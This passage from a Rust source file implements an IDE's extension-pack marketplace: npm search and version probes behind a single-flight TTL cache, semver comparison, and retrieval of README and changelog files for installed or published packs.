    std::fs::remove_dir_all(dir).map_err(|e| format!("remove: {e}"))
}

/// Best-effort reverse-lookup: manifest id → installed pack directory. Used
/// so callers holding only a manifest id (like the Console UI) can uninstall
/// without also carrying the pack's npm package name.
fn pack_dir_by_manifest_id(ext_id: &str) -> Option<PathBuf> {
    for base in pack_dirs() {
        if !base.is_dir() {
            continue;
        }
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id == ext_id {
            return Some(base);
        }
    }
    None
}

/// The version of an installed pack, read from its bundled `package.json` (the
/// `npm pack` tarball carries it). `None` when the pack isn't installed or has
/// no readable version — used to tell whether a newer npm release is available.
pub fn installed_version(pkg: &str) -> Option<String> {
    let dir = safe_pkg_dir(pkg)?;
    let txt = std::fs::read_to_string(dir.join("package.json")).ok()?;
    let v: serde_json::Value = serde_json::from_str(&txt).ok()?;
    v.get("version")
        .and_then(|x| x.as_str())
        .filter(|s| !s.is_empty())
        .map(String::from)
}

// ---------------------------------------------------------------------------
// Marketplace — discover packs on npm by the `nano-ide-ext` keyword
// ---------------------------------------------------------------------------

/// The discovery keyword every published pack carries. The marketplace lists
/// every npm package tagged with it; categories come from `nano-ide-{lang,app,
/// example}`.
pub const MARKETPLACE_KEYWORD: &str = "nano-ide-ext";

/// How many search hits to request from `npm search`.
///
/// `npm search` defaults to **20** results (`--searchlimit`). The marketplace
/// lists *every* pack carrying [`MARKETPLACE_KEYWORD`], so once the ecosystem
/// grows past 20 packs the default silently truncates the tail — npm ranks by
/// popularity, so brand-new / low-download packs (exactly the ones a user is
/// hunting for) drop off the list first. `250` is the registry search
/// endpoint's (`/-/v1/search`) hard per-request cap, so this requests the
/// largest single page npm will serve. If the tagged ecosystem ever exceeds
/// 250 packs the *next* boundary is real pagination (`from`/`size`); until then
/// one maxed-out page keeps the whole catalogue visible.
pub const MARKETPLACE_SEARCH_LIMIT: usize = 250;

/// The exact `npm search` argument vector the marketplace shells out with.
///
/// Factored out as the single source of truth so the [`MARKETPLACE_SEARCH_LIMIT`]
/// guard can assert the `--searchlimit` is present and sufficient without
/// spawning `npm` (see the `marketplace_search_args_cap_the_result_page` test).
fn marketplace_search_args() -> Vec<String> {
    vec![
        "search".to_string(),
        format!("keywords:{MARKETPLACE_KEYWORD}"),
        "--json".to_string(),
        format!("--searchlimit={MARKETPLACE_SEARCH_LIMIT}"),
    ]
}

/// One npm package surfaced in the marketplace.
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct MarketEntry {
    pub name: String,
    pub version: String,
    pub description: String,
    /// "lang" | "app" | "example" | "theme" | "trigger" | "agentic-sdlc" |
    /// "other", from keywords.
    pub category: String,
    /// True when the package is first-party: its npm name is scoped
    /// `@nanobpm/`. Non-official packages carrying the marketplace keyword are
    /// surfaced under the console's "Community extensions" section.
    pub official: bool,
    pub installed: bool,
    /// The locally-installed version, when this pack is installed (else `None`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub installed_version: Option<String>,
    /// True when the pack is installed and its version differs from the latest
    /// on npm — i.e. an update can be pulled.
    pub update_available: bool,
    /// Browsable source-repository URL (normalized from the package's npm
    /// `repository` field), when published. Lets users read the source and
    /// report issues upstream.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub repository: Option<String>,
    /// Package homepage URL, when published.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub homepage: Option<String>,
    /// The package's page on the npm registry.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub npm_url: Option<String>,
    /// True when the installed pack ships a `CHANGELOG.md`, so the console can
    /// offer a "What's changed" affordance only when there is something to show.
    /// Cheap, offline probe of the installed copy — a not-installed pack's
    /// published changelog is only resolved on demand (see [`pack_changelog`]),
    /// so this stays `false` for packs the user has not installed.
    pub changelog_available: bool,
}

/// Accept a URL only when it uses an `http`/`https` scheme, rejecting anything
/// else (e.g. `javascript:`, `data:`, `file:`). npm package metadata is
/// untrusted input rendered into `<a href>` in the console, so this guards
/// against URL-injection / XSS on click. Case-insensitive on the scheme.
fn safe_http_url(s: &str) -> Option<String> {
    let s = s.trim();
    let lower = s.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        Some(s.to_string())
    } else {
        None
    }
}

/// Normalize an npm `repository` URL into a browsable https URL. npm surfaces
/// forms like `git+https://github.com/owner/repo.git`, `git://…`, or the SCP-ish
/// `git@github.com:owner/repo.git`; all are rewritten to `https://…/owner/repo`.
/// Returns `None` for empty input or any URL that is not http(s) after
/// normalization (untrusted npm metadata — see `safe_http_url`).
fn normalize_repo_url(raw: &str) -> Option<String> {
    let s = raw.trim();
    if s.is_empty() {
        return None;
    }
    // `git@github.com:owner/repo(.git)` → `https://github.com/owner/repo`
    if let Some(rest) = s.strip_prefix("git@")
        && let Some((host, path)) = rest.split_once(':')
    {
        let path = path.trim_end_matches(".git");
        return Some(format!("https://{host}/{path}"));
    }
    let s = s.strip_prefix("git+").unwrap_or(s);
    let s = if let Some(rest) = s.strip_prefix("git://") {
        format!("https://{rest}")
    } else if let Some(rest) = s.strip_prefix("ssh://git@") {
        format!("https://{rest}")
    } else {
        s.to_string()
    };
    safe_http_url(s.trim_end_matches(".git"))
}

/// Marketplace category derived from a pack's npm keywords. Categories are
/// tested in a fixed priority order (lang → app → example → theme → trigger →
/// agentic-sdlc): if a pack carries keywords for several categories, the first
/// one in that chain wins regardless of keyword order. Falls back to `"other"`
/// when no category keyword is present.
fn classify_category(keywords: &[String]) -> &'static str {
    if keywords.iter().any(|k| k == "nano-ide-lang") {
        "lang"
    } else if keywords.iter().any(|k| k == "nano-ide-app") {
        "app"
    } else if keywords.iter().any(|k| k == "nano-ide-example") {
        "example"
    } else if keywords.iter().any(|k| k == "nano-ide-theme") {
        "theme"
    } else if keywords.iter().any(|k| k == "nano-ide-trigger") {
        "trigger"
    } else if keywords.iter().any(|k| k == "nano-ide-agentic-sdlc") {
        "agentic-sdlc"
    } else {
        "other"
    }
}

/// A pack is first-party ("official") when published under the `@nanobpm/` npm
/// scope. Anything else carrying the marketplace keyword is a community pack.
fn is_official(name: &str) -> bool {
    name.starts_with("@nanobpm/")
}

/// How long a computed marketplace listing is served from cache before the next
/// request recomputes it. Update discovery does not need second-level freshness,
/// and every recompute shells out to `npm` once per installed pack; without a
/// TTL every 30 s poll (several tabs, each with a `visibilitychange` kick) fans
/// a fresh `npm search` + per-pack `npm view` burst out at the OS, which on a
/// small host swap-thrashed the whole machine (issue #1330). Five minutes keeps
/// the badge usefully current while collapsing that burst to at most one per
/// window. An explicit "check now" bypasses this via [`marketplace_refresh`].
const MARKETPLACE_CACHE_TTL: std::time::Duration = std::time::Duration::from_secs(300);

/// Max concurrent `npm view` probes [`refresh_installed_latest`] runs. The old
/// code spawned **one OS thread + one `npm view` Node process per installed
/// pack, all at once** (issue #1330) — 6 packs meant 6 simultaneous ~40–80 MB
/// Node processes per request, and nothing bounded overlapping requests. A small
/// fixed pool caps the per-request process footprint regardless of how many
/// packs are installed.
const REFRESH_LATEST_CONCURRENCY: usize = 2;

/// Runs an `npm` invocation and returns its captured output. Factored out behind
/// a trait so the single-flight / concurrency guards can inject a counting
/// spawner (issue #1330) and assert the process fan-out without shelling out to
/// a real `npm`.
pub trait NpmRunner: Send + Sync {
    fn run(&self, args: &[&str]) -> std::io::Result<std::process::Output>;
}

/// The production [`NpmRunner`]: shells out to the resolved `npm` binary.
struct NpmCli {
    npm: PathBuf,
}

impl NpmRunner for NpmCli {
    fn run(&self, args: &[&str]) -> std::io::Result<std::process::Output> {
        std::process::Command::new(&self.npm).args(args).output()
    }
}

/// A single-flight, TTL'd cache for the marketplace listing. The expensive
/// computation ([`marketplace_impl`]) shells out to `npm` once per installed
/// pack, so it must never run concurrently with itself: concurrent callers
/// (several studio tabs polling every few minutes, a `visibilitychange` kick,
/// an explicit "check now") all share one in-flight computation, and a result
/// is reused for [`MARKETPLACE_CACHE_TTL`] before the next recompute. This is
/// the server-side half of the #1330 fix — without it N concurrent requests
/// each started their own full `npm` fan-out.
///
/// The cache holds **registry metadata only**: the per-entry installation
/// state (`installed`, `installed_version`, `update_available`,
/// `changelog_available`) is re-derived from the live pack store on every
/// response by [`overlay_install_state`], so an install / update / removal is
/// reflected immediately instead of going stale for the rest of the TTL.
struct MarketplaceCache {
    ttl: std::time::Duration,
    state: std::sync::Mutex<MarketplaceCacheState>,
    /// Test-only instrumentation: invoked (holding no lock) each time a caller
    /// commits to joining the in-flight computation as a waiter. Lets a test
    /// release the leader only once every follower has *provably* joined the
    /// single flight, instead of sleeping and hoping the scheduler got there.
    #[cfg(test)]
    on_waiter_joined: std::sync::Mutex<Option<Box<dyn Fn() + Send + Sync>>>,
    /// Test-only instrumentation: invoked (holding no lock) by a waiter right
    /// before it blocks on the flight's `ready` condvar — after it has cloned
    /// the per-flight `Arc` but before it reads the outcome. Lets a test hold
    /// one follower parked at the exact moment the per-flight isolation must
    /// protect it, then start a *second* flight and prove the parked follower
    /// still reads its own flight's outcome.
    #[cfg(test)]
    on_waiter_wait: std::sync::Mutex<Option<Box<dyn Fn() + Send + Sync>>>,
}

/// The outcome of one shared computation, cloned to every caller that joined
/// it — success **and** failure. Sharing the failure matters: if only the
/// leader saw the error, each of N waiters would wake, become the next leader,
/// and serially repeat the same failing `npm search` (N sequential registry
/// timeouts for one burst of requests).
type ComputeResult = Result<std::sync::Arc<Vec<MarketEntry>>, String>;

/// One in-flight computation. Each leader installs a **fresh** `Flight`; every
/// caller that joins it clones this `Arc` and blocks on the flight's own
/// `ready` condvar, reading the result from this exact flight's `outcome`
/// slot. Because the handle is per-flight rather than a single shared "last
/// outcome" slot, a *later* leader starting a new computation can never clobber
/// the slot an earlier flight's waiters are about to read — so a waiter whose
/// own run already completed is never dragged through an unrelated run's `npm`
/// timeout (#1330).
struct Flight {
    /// `None` until the leader publishes; then the shared success/failure that
    /// every waiter of this flight clones.
    outcome: std::sync::Mutex<Option<ComputeResult>>,
    ready: std::sync::Condvar,
}

struct MarketplaceCacheState {
    /// The last successfully computed listing and when it was stored.
    value: Option<(std::time::Instant, std::sync::Arc<Vec<MarketEntry>>)>,
    /// The computation currently running, if any. A caller that finds this
    /// `Some` joins that exact flight (cloning the `Arc`) instead of starting a
    /// second `npm` fan-out; the leader clears it back to `None` when it
    /// finishes, so the next request starts a fresh flight.
    in_flight: Option<std::sync::Arc<Flight>>,
}

impl MarketplaceCache {
    fn new(ttl: std::time::Duration) -> Self {
        Self {
            ttl,
            state: std::sync::Mutex::new(MarketplaceCacheState {
                value: None,
                in_flight: None,
            }),
            #[cfg(test)]
            on_waiter_joined: std::sync::Mutex::new(None),
            #[cfg(test)]
            on_waiter_wait: std::sync::Mutex::new(None),
        }
    }

    /// Install the test-only "a waiter joined" hook (see [`on_waiter_joined`]).
    #[cfg(test)]
    fn set_on_waiter_joined(&self, f: impl Fn() + Send + Sync + 'static) {
        *self.on_waiter_joined.lock().unwrap() = Some(Box::new(f));
    }

    /// Install the test-only "a waiter is about to block" gate (see
    /// [`on_waiter_wait`]).
    #[cfg(test)]
    fn set_on_waiter_wait(&self, f: impl Fn() + Send + Sync + 'static) {
        *self.on_waiter_wait.lock().unwrap() = Some(Box::new(f));
    }

    #[cfg(test)]
    fn note_waiter_joined(&self) {
        if let Some(cb) = self.on_waiter_joined.lock().unwrap().as_ref() {
            cb();
        }
    }

    #[cfg(test)]
    fn note_waiter_wait(&self) {
        if let Some(cb) = self.on_waiter_wait.lock().unwrap().as_ref() {
            cb();
        }
    }

    /// Return the cached listing when it is fresh (and `force` is false),
    /// otherwise recompute it exactly once across all concurrent callers.
    /// `force` bypasses the TTL but still joins the single in-flight
    /// computation — a "check now" never fans out a second `npm` burst on top
    /// of an in-progress one.
    fn fetch<F>(&self, force: bool, compute: F) -> ComputeResult
    where
        F: FnOnce() -> Result<Vec<MarketEntry>, String>,
    {
        // Phase 1: either return a fresh/shared result, or become the leader
        // and take ownership of a fresh `Flight`.
        let flight = {
            let mut st = self.state.lock().unwrap();
            if !force
                && let Some((at, v)) = &st.value
                && at.elapsed() < self.ttl
            {
                return Ok(std::sync::Arc::clone(v));
            }
            if let Some(flight) = &st.in_flight {
                // Someone else is already recomputing. Join *that exact*
                // flight and wait on its own condvar — even a forced caller,
                // because the in-flight run is itself producing a fresh
                // listing. The outcome is shared with every waiter, failure
                // included: a failed `npm search` is answered to the whole
                // burst at once rather than re-attempted serially by each
                // waiter. Capturing the flight handle (not a shared slot a
                // later leader could clear) means a waiter always reads the
                // result of the run it joined — never a newer leader's.
                let flight = std::sync::Arc::clone(flight);
                drop(st);
                #[cfg(test)]
                self.note_waiter_joined();
                // Gate point for the isolation test: a follower can be parked
                // here — holding its per-flight `Arc`, not yet reading the
                // outcome — while a later leader completes a *second* flight.
                #[cfg(test)]
                self.note_waiter_wait();
                let mut outcome = flight.outcome.lock().unwrap();
                while outcome.is_none() {
                    outcome = flight.ready.wait(outcome).unwrap();
                }
                return outcome
                    .as_ref()
                    .expect("a settled flight always carries an outcome")
                    .clone();
            }
            // Become the leader for this recompute: install a fresh flight
            // that this call owns and every concurrent joiner will wait on.
            let flight = std::sync::Arc::new(Flight {
                outcome: std::sync::Mutex::new(None),
                ready: std::sync::Condvar::new(),
            });
            st.in_flight = Some(std::sync::Arc::clone(&flight));
            flight
        };

        // Catch an unwind so a panicking computation can never strand the
        // flight (`in_flight` set, no outcome → every later request waits
        // forever). The panic still aborts the leader's own call — as an error,
        // not a hang.
        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(compute))
            .unwrap_or_else(|_| Err("marketplace computation panicked".to_string()));

        // Record the fresh value (success only — a failed refresh must not
        // evict a still-usable listing) and retire this flight from `in_flight`
        // so the next request starts a new one.
        let shared: ComputeResult = {
            let mut st = self.state.lock().unwrap();
            let shared = match result {
                Ok(entries) => {
                    let arc = std::sync::Arc::new(entries);
                    st.value = Some((std::time::Instant::now(), std::sync::Arc::clone(&arc)));
                    Ok(arc)
                }
                Err(e) => Err(e),
            };
            st.in_flight = None;
            shared
        };

        // Publish to *this* flight's waiters (success and failure alike): each
        // clones the shared outcome rather than starting its own `npm` fan-out.
        let mut outcome = flight.outcome.lock().unwrap();
        *outcome = Some(shared.clone());
        flight.ready.notify_all();
        shared
    }
}

/// Process-global marketplace cache backing [`marketplace`].
fn marketplace_cache() -> &'static MarketplaceCache {
    static CACHE: std::sync::OnceLock<MarketplaceCache> = std::sync::OnceLock::new();
    CACHE.get_or_init(|| MarketplaceCache::new(MARKETPLACE_CACHE_TTL))
}

/// Browse npm for packs tagged `nano-ide-ext`. Served from a short-lived
/// single-flight cache (see [`MarketplaceCache`]) so a burst of concurrent
/// pollers collapses to one `npm` fan-out. `force` is the "check now" bypass
/// that skips the cache TTL but still joins the single in-flight computation —
/// it never starts a second `npm` burst on top of an in-progress one.
/// Best-effort; empty on offline/error.
///
/// The cache holds registry metadata only; the installation state of every
/// entry is re-derived from the live pack store on each response
/// ([`overlay_install_state`]) so an install / update / removal is visible
/// immediately rather than after the cache TTL expires.
pub fn marketplace_refresh(force: bool) -> Result<Vec<MarketEntry>, String> {
    marketplace_cache()
        .fetch(force, || {
            let npm = find_program("npm").ok_or("npm not found on PATH")?;
            marketplace_impl(&NpmCli { npm })
        })
        .map(|arc| overlay_install_state((*arc).clone()))
}

/// Compare two version strings by semantic-version **precedence**
/// (semver.org §11): the numeric core is compared field-by-field numerically
/// (missing trailing fields treated as `0`), a pre-release version ranks below
/// its associated normal version, and build metadata (`+…`) is ignored. A
/// leading `v` on either side is tolerated.
///
/// Returns `None` when either side carries a non-numeric core field we cannot
/// order (e.g. a dist-tag like `latest`): callers then conservatively decline
/// rather than guess an up/downgrade.
fn version_cmp(a: &str, b: &str) -> Option<std::cmp::Ordering> {
    use std::cmp::Ordering;
    fn split(v: &str) -> Option<(Vec<u64>, Option<String>)> {
        let v = v.trim().trim_start_matches('v');
        // Build metadata does not affect precedence.
        let v = v.split('+').next().unwrap_or("");
        let (core, pre) = match v.split_once('-') {
            Some((c, p)) => (c, (!p.is_empty()).then(|| p.to_string())),
            None => (v, None),
        };
        if core.is_empty() {
            return None;
        }
        let nums = core
            .split('.')
            .map(|p| p.parse::<u64>().ok())
            .collect::<Option<Vec<u64>>>()?;
        Some((nums, pre))
    }
    /// A SemVer *numeric* pre-release identifier: a non-empty run of ASCII
    /// digits (§11.4.1). This is the classification SemVer applies — it does
    /// **not** impose an integer-width limit, so an identifier that overflows
    /// `u64` (e.g. `99999999999999999999`) is still numeric and must order by
    /// value, not lexically.
    fn is_numeric_identifier(s: &str) -> bool {
        !s.is_empty() && s.bytes().all(|b| b.is_ascii_digit())
    }

    /// Order two numeric pre-release identifiers by value with no width limit:
    /// more significant digits (after stripping leading zeros) wins, ties break
    /// lexically. Avoids `u64` parsing so arbitrarily large identifiers compare
    /// correctly — a lexical compare of `…99999` vs `…100000…` would invert
    /// their numeric order and hide an available update.
    fn cmp_numeric_identifiers(x: &str, y: &str) -> Ordering {
        let nx = x.trim_start_matches('0');
        let ny = y.trim_start_matches('0');
        nx.len().cmp(&ny.len()).then_with(|| nx.cmp(ny))
    }

    fn cmp_prerelease(a: &str, b: &str) -> Ordering {
        let mut ai = a.split('.');
        let mut bi = b.split('.');
        loop {
            match (ai.next(), bi.next()) {
                (None, None) => return Ordering::Equal,
                // A larger set of pre-release fields (when all preceding are
                // equal) has higher precedence.
                (None, Some(_)) => return Ordering::Less,
                (Some(_), None) => return Ordering::Greater,
                (Some(x), Some(y)) => {
                    let ord = match (is_numeric_identifier(x), is_numeric_identifier(y)) {
                        // Numeric identifiers order by value, no width limit.
                        (true, true) => cmp_numeric_identifiers(x, y),
                        // Numeric identifiers always rank lower than
                        // alphanumeric ones.
                        (true, false) => Ordering::Less,
                        (false, true) => Ordering::Greater,
                        // Alphanumeric identifiers order by ASCII lexical order.
                        (false, false) => x.cmp(y),
                    };
                    if ord != Ordering::Equal {
                        return ord;
                    }
                }
            }
        }
    }
    let (ca, pa) = split(a)?;
    let (cb, pb) = split(b)?;
    let n = ca.len().max(cb.len());
    for i in 0..n {
        let x = ca.get(i).copied().unwrap_or(0);
        let y = cb.get(i).copied().unwrap_or(0);
        match x.cmp(&y) {
            Ordering::Equal => {}
            ord => return Some(ord),
        }
    }
    Some(match (&pa, &pb) {
        (None, None) => Ordering::Equal,
        // A pre-release ranks below the normal release of the same core.
        (Some(_), None) => Ordering::Less,
        (None, Some(_)) => Ordering::Greater,
        (Some(x), Some(y)) => cmp_prerelease(x, y),
    })
}

/// `true` iff `a` is strictly older than `b` by semver precedence. Unorderable
/// inputs yield `false` — we decline to advertise an update rather than risk a
/// bogus up/downgrade off stale metadata.
fn version_lt(a: &str, b: &str) -> bool {
    matches!(version_cmp(a, b), Some(std::cmp::Ordering::Less))
}

/// The one canonical derivation of a marketplace entry's installation state
/// from the live pack store: `installed`, `installed_version`,
/// `update_available` (against the entry's current `version`), and
/// `changelog_available`. Used both when a listing is computed
/// ([`marketplace_impl`]) and when a cached listing is projected onto the
/// current disk state for a response ([`overlay_install_state`]) — a single
/// source of truth so the two paths can never drift.
fn derive_install_state(entry: &mut MarketEntry) {
    let inst_ver = installed_version(&entry.name);
    let installed = inst_ver.is_some()
        || safe_pkg_dir(&entry.name)
            .map(|d| d.is_dir())
            .unwrap_or(false);
    // Flag an update only when we can read the installed version AND the
    // latest published version is **strictly newer** by semantic-version
    // ordering. A plain `iv != latest` inequality falsely advertises an
    // "update" to an *older* version whenever the cached registry metadata
    // lags the pack actually on disk — e.g. a pack cached as uninstalled at
    // 2.0.0, then installed after npm published 2.1.0: the unpinned install
    // lands 2.1.0, but the stale cached `version` (2.0.0) would otherwise
    // offer a downgrade "update". Comparing by precedence keeps Update honest
    // regardless of how stale the cached `version` is (#1330).
    let update_available = inst_ver
        .as_deref()
        .map(|iv| version_lt(iv, &entry.version))
        .unwrap_or(false);
    let changelog_available = installed && installed_changelog_path(&entry.name).is_some();
    entry.installed = installed;
    entry.installed_version = inst_ver;
    entry.update_available = update_available;
    entry.changelog_available = changelog_available;
}

/// Project a (possibly cached) listing onto the **current** local pack store:
/// registry metadata (name, description, links, latest published version) may
/// be served from the cache, but installation state must reflect installs,
/// updates, and removals that happened since the listing was computed —
/// otherwise a fresh install still offers "Install" and a removed pack still
/// appears installed until the cache TTL expires.
fn overlay_install_state(mut entries: Vec<MarketEntry>) -> Vec<MarketEntry> {
    for entry in &mut entries {
        derive_install_state(entry);
    }
    entries
}

/// The uncached marketplace computation: one `npm search`, then a bounded
/// per-installed-pack `npm view` refresh. Shells out via the injected
/// [`NpmRunner`] so guards can count the process fan-out.
fn marketplace_impl(runner: &dyn NpmRunner) -> Result<Vec<MarketEntry>, String> {
    let search_args = marketplace_search_args();
    let search_argv: Vec<&str> = search_args.iter().map(String::as_str).collect();
    let out = runner
        .run(&search_argv)
        .map_err(|e| format!("npm search: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "npm search failed: {}",
            String::from_utf8_lossy(&out.stderr)
        ));
    }
    let raw: Vec<serde_json::Value> =
        serde_json::from_slice(&out.stdout).map_err(|e| format!("parse search: {e}"))?;
    let mut entries: Vec<MarketEntry> = raw
        .into_iter()
        .map(|p| {
            let kws: Vec<String> = p["keywords"]
                .as_array()
                .map(|a| {
                    a.iter()
                        .filter_map(|k| k.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default();
            let category = classify_category(&kws);
            let name = p["name"].as_str().unwrap_or_default().to_string();
            // First-party packs live under the `@nanobpm/` npm scope; anything
            // else carrying the marketplace keyword is a community extension.
            let official = is_official(&name);
            let latest = p["version"].as_str().unwrap_or_default().to_string();
            let links = &p["links"];
            let repository = links["repository"].as_str().and_then(normalize_repo_url);
            let homepage = links["homepage"].as_str().and_then(safe_http_url);
            let npm_url = links["npm"].as_str().and_then(safe_http_url);
            let mut entry = MarketEntry {
                installed: false,
                version: latest,
                description: p["description"].as_str().unwrap_or_default().to_string(),
                category: category.to_string(),
                official,
                installed_version: None,
                update_available: false,
                repository,
                homepage,
                npm_url,
                changelog_available: false,
                name,
            };
            // The same canonical projection [`overlay_install_state`] applies
            // when a cached listing is served — one derivation, no drift.
            derive_install_state(&mut entry);
            entry
        })
        .collect();
    entries.sort_by(|a, b| a.category.cmp(&b.category).then(a.name.cmp(&b.name)));
    // npm's search index lags publication by minutes to hours. For any pack
    // the user has installed, hit `npm view <name> version --prefer-online`
    // to get the actual published latest — otherwise a freshly-published fix
    // won't surface an "Update" affordance in the console for a long time.
    // Bounded concurrency keeps the process fan-out small regardless of the
    // installed-pack count (issue #1330).
    refresh_installed_latest(runner, &mut entries, REFRESH_LATEST_CONCURRENCY);
    Ok(entries)
}

/// For each installed entry, overlay the current `latest` via `npm view` and
/// recompute `update_available`. `npm view --prefer-online` bypasses the local
/// metadata cache and hits registry.npmjs.org directly. Failures are ignored
/// (the search result stands).
///
/// Capped at `cap` concurrent probes (issue #1330): the probes are drained from
/// a shared queue by a fixed pool of worker threads, so at most `cap` `npm view`
/// Node processes are ever alive at once — not one per installed pack.
fn refresh_installed_latest(runner: &dyn NpmRunner, entries: &mut [MarketEntry], cap: usize) {
    use std::collections::VecDeque;
    use std::sync::{Arc, Mutex};
    let jobs: VecDeque<(usize, String)> = entries
        .iter()
        .enumerate()
        .filter(|(_, e)| e.installed)
        .map(|(idx, e)| (idx, e.name.clone()))
        .collect();
    if jobs.is_empty() {
        return;
    }
    let workers = cap.max(1).min(jobs.len());
    let queue: Arc<Mutex<VecDeque<(usize, String)>>> = Arc::new(Mutex::new(jobs));
    let updates: Arc<Mutex<Vec<(usize, String)>>> = Arc::new(Mutex::new(Vec::new()));
    std::thread::scope(|scope| {
        for _ in 0..workers {
            let queue = Arc::clone(&queue);
            let updates = Arc::clone(&updates);
            scope.spawn(move || {
                loop {
                    let Some((idx, name)) = queue.lock().unwrap().pop_front() else {
                        break;
                    };
                    let out =
                        runner.run(&["view", &name, "version", "--prefer-online", "--silent"]);
                    if let Ok(o) = out
                        && o.status.success()
                    {
                        let v = String::from_utf8_lossy(&o.stdout).trim().to_string();
                        if !v.is_empty() {
                            updates.lock().unwrap().push((idx, v));
                        }
                    }
                }
            });
        }
    });
    for (idx, latest) in updates.lock().unwrap().drain(..) {
        let e = &mut entries[idx];
        e.version = latest;
        // Re-derive the install state against the fresh `version` so
        // `update_available` uses the one canonical comparison.
        derive_install_state(e);
    }
}

/// A pack's README and where it came from — surfaced in the marketplace UI so a
/// user can read the pack's docs before (or after) installing.
pub struct PackReadme {
    pub readme: String,
    /// True when the README was read from an installed pack (vs fetched from npm).
    pub installed: bool,
}

/// The README (markdown) for an extension pack. For an installed pack this reads
/// the bundled `README.md`; otherwise it shells `npm view <pkg> readme` to pull
/// the published README from the registry. `None` when neither yields text
/// (unknown pack, no README, or npm unavailable/offline).
pub fn pack_readme(pkg: &str) -> Option<PackReadme> {
    // Prefer the installed copy: it matches exactly what's running, works
    // offline, and needs no network round-trip.
    if let Some(dir) = safe_pkg_dir(pkg).filter(|d| d.is_dir()) {
        for name in ["README.md", "readme.md", "README", "Readme.md"] {
            if let Ok(txt) = std::fs::read_to_string(dir.join(name))
                && !txt.trim().is_empty()
            {
                return Some(PackReadme {
                    readme: txt,
                    installed: true,
                });
            }
        }
    }
    // Not installed (or no bundled README): fall back to the registry. npm's
    // `readme` field carries the full published README markdown.
    let npm = find_program("npm")?;
    let out = std::process::Command::new(&npm)
        .args(["view", pkg, "readme", "--silent"])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let txt = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if txt.is_empty() || txt == "undefined" {
        return None;
    }
    Some(PackReadme {
        readme: txt,
        installed: false,
    })
}

/// Candidate `CHANGELOG` filenames, most-common first. Shared by the
/// installed-pack availability probe and [`pack_changelog`] so the two never
/// drift on which names count as a changelog.
const CHANGELOG_FILENAMES: [&str; 5] = [
    "CHANGELOG.md",
    "changelog.md",
    "CHANGELOG",
    "Changelog.md",
    "HISTORY.md",
];

/// Path to an installed pack's bundled changelog file, if it ships one. `None`
/// when the pack is not installed or carries no changelog. Offline, no network.
fn installed_changelog_path(pkg: &str) -> Option<PathBuf> {
    let dir = safe_pkg_dir(pkg).filter(|d| d.is_dir())?;
    CHANGELOG_FILENAMES
        .iter()
        .map(|n| dir.join(n))
        .find(|p| p.is_file())
}

/// A pack's changelog (release notes) and where it came from — surfaced in the
/// marketplace/update UI so a user can see *what changed* before updating.
pub struct PackChangelog {
    /// The changelog markdown. Scoped to the installed→latest delta when
    /// [`PackChangelog::delta`] is true, else the full changelog.
    pub changelog: String,
    /// True when the changelog was read from an installed pack (vs fetched from
    /// the registry tarball).
    pub installed: bool,
    /// True when `changelog` was narrowed to just the entries between the
    /// installed and latest versions (vs the full history).
    pub delta: bool,
}

/// The changelog (markdown) for an extension pack. Reads the bundled
/// `CHANGELOG.md` of an installed pack, or downloads the published registry
/// tarball (`npm pack <pkg>@<to>`) and reads the changelog from it — npm does
/// not expose `changelog` via `npm view` the way it does `readme`. Which source
/// is preferred depends on whether a delta is wanted; see
/// [`select_changelog_source`].
///
/// When `from` (the installed version) is given and the changelog's version
/// headings are parseable, the result is scoped to the delta between `from` and
/// the latest — the entries newer than what the user is running — matching the
/// "What's changed" update affordance. Falls back to the full changelog when
/// the headings can't be parsed. `None` when no changelog can be resolved
/// (unknown pack, ships none, or offline) — mirroring [`pack_readme`].
///
/// See [`select_changelog_source`] for why the *update* case (`from` set)
/// prefers the published tarball over the installed copy.
pub fn pack_changelog(pkg: &str, from: Option<&str>, to: Option<&str>) -> Option<PackChangelog> {
    // Treat an empty/whitespace `from` (e.g. `?from=`) as absent: there is no
    // usable installed version to delta against, so it must not force the
    // registry-tarball fetch that the update case triggers.
    let from = from.filter(|f| !f.trim().is_empty());
    let read_installed = || {
        installed_changelog_path(pkg).and_then(|path| {
            std::fs::read_to_string(&path)
                .ok()
                .filter(|txt| !txt.trim().is_empty())
        })
    };
    let fetch_published = || fetch_published_changelog(pkg, to);
    let (raw, installed) =
        select_changelog_source(from.is_some(), read_installed, fetch_published)?;
    // Scope to the installed→latest delta when we know the installed version and
    // the headings parse; otherwise show the whole changelog.
    let (changelog, delta) = match from.and_then(|f| changelog_delta(&raw, f)) {
        Some(d) => (d, true),
        None => (raw, false),
    };
    Some(PackChangelog {
        changelog,
        installed,
        delta,
    })
}

/// Pick which changelog source to read and in what order, returning
/// `(markdown, installed_flag)`.
///
/// The order flips on whether we need an installed→latest *delta*
/// (`want_delta`, i.e. the caller supplied a `from` version):
///
/// * **Update case (`want_delta`):** prefer the *published* tarball. The
///   installed pack's `CHANGELOG.md` only carries headings up to the version
///   that is currently running, so it can never contain the newer releases the
///   delta is supposed to surface — reading it would make `changelog_delta`
///   return `None` and collapse the "What's changed" affordance to the old,
///   full changelog. Fall back to the installed copy only when the registry
///   fetch fails (offline), so we still show *something*.
/// * **Full-changelog case (no `want_delta`):** prefer the installed copy — it
///   matches what's running, works offline, and needs no network round-trip.
///
/// Split out from [`pack_changelog`] so the source-ordering logic is unit
/// testable without touching the filesystem or the network.
fn select_changelog_source(
    want_delta: bool,
    read_installed: impl FnOnce() -> Option<String>,
    fetch_published: impl FnOnce() -> Option<String>,
) -> Option<(String, bool)> {
    if want_delta {
        match fetch_published() {
            Some(txt) => Some((txt, false)),
            None => read_installed().map(|txt| (txt, true)),
        }
    } else {
        match read_installed() {
            Some(txt) => Some((txt, true)),
            None => fetch_published().map(|txt| (txt, false)),
        }
    }
}

/// Download a package's published registry tarball and read its changelog
/// markdown. `version` pins the exact published version (e.g. the latest);
